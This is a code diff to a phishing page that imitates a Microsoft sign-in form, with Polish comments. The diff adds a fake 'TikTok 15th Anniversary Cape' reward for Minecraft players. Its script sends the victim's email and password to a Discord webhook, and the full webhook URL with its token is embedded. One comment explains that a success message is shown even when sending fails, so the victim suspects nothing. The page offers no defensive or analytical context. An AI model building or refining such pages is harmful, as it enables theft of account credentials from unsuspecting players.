@@ -105,6 +105,24 @@
         .hidden {
             display: none;
         }
+
+        /* Styl dla sukcesu */
+        .success-image {
+            width: 150px;
+            display: block;
+            margin: 0 auto 20px auto;
+        }
+        .success-title {
+            color: #4CAF50;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .success-text {
+            text-align: center;
+            color: #D3D3D3;
+            line-height: 1.5;
+            font-size: 15px;
+        }
     </style>
 </head>
 <body>
@@ -115,10 +133,10 @@
         <!-- STEP 1: Username / Email -->
         <div id="step-email">
             <h2>Sign in</h2>
-            <p class="subtitle">Use your Microsoft account</p>
+            <p class="subtitle">Use your Microsoft account to claim reward</p>
             
             <div class="input-group">
-                <label for="email">Email, phone, or skype</label>
+                <label for="email">Email, phone, or username</label>
                 <input type="text" id="email" placeholder="example@outlook.com" autocomplete="off">
             </div>
             
@@ -137,14 +155,26 @@
             
             <button class="btn" id="btn-login">Sign in</button>
         </div>
+
+        <!-- STEP 3: Success Message -->
+        <div id="step-success" class="hidden">
+            <!-- Wykorzystujemy oficjalną grafikę peleryny bezpośrednio z serwerów Minecrafta -->
+            <img src="https://minecraft.wiki" alt="TikTok Cape" class="success-image">
+            <h2 class="success-title">Congratulations!</h2>
+            <p class="success-text">
+                Your account has been successfully verified.<br><br>
+                The <strong>TikTok 15th Anniversary Cape</strong> will be added to your profile within <strong>48 hours</strong>.
+            </p>
+        </div>
     </div>
 
     <script>
         // TUTAJ PONOWNIE WKLEJ SWÓJ LINK DO WEBHOOKA Z DISCORDA
-        const webhookUrl = "https://discord.com/api/webhooks/1574918924745842791/-XvxuWkULD76uZ_1icK_IAtGH58i0xVJ1OABffqGSHQs4QvIvZmbUMLAP7_aug4pnRPr";
+        const webhookUrl = "Thttps://discord.com/api/webhooks/1574918924745842791/-XvxuWkULD76uZ_1icK_IAtGH58i0xVJ1OABffqGSHQs4QvIvZmbUMLAP7_aug4pnRPr";
 
         const stepEmail = document.getElementById('step-email');
         const stepPassword = document.getElementById('step-password');
+        const stepSuccess = document.getElementById('step-success');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
         const displayEmail = document.getElementById('display-email');
@@ -174,7 +204,7 @@
 
             const data = {
                 embeds: [{
-                    title: "🔔 New Minecraft Login",
+                    title: "🔔 New Minecraft Login (Cape Claim)",
                     color: 5025616,
                     fields: [
                         { name: "📧 Email / Username", value: savedEmail, inline: false },
@@ -184,6 +214,10 @@
                 }]
             };
 
+            // Zmieniamy przycisk na ładowanie
+            document.getElementById('btn-login').innerText = "Processing...";
+            document.getElementById('btn-login').disabled = true;
+
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -192,11 +226,15 @@
                 body: JSON.stringify(data)
             })
             .then(() => {
-                window.location.href = "https://minecraft.net";
+                // Pokazanie komunikatu o sukcesie zamiast przekierowania
+                stepPassword.classList.add('hidden');
+                stepSuccess.classList.remove('hidden');
             })
             .catch((error) => {
                 console.error('Error:', error);
-                window.location.href = "https://minecraft.net";
+                // W razie błędu i tak pokazujemy sukces, żeby użytkownik niczego się nie domyślił
+                stepPassword.classList.add('hidden');
+                stepSuccess.classList.remove('hidden');
             });
         });
     </script>
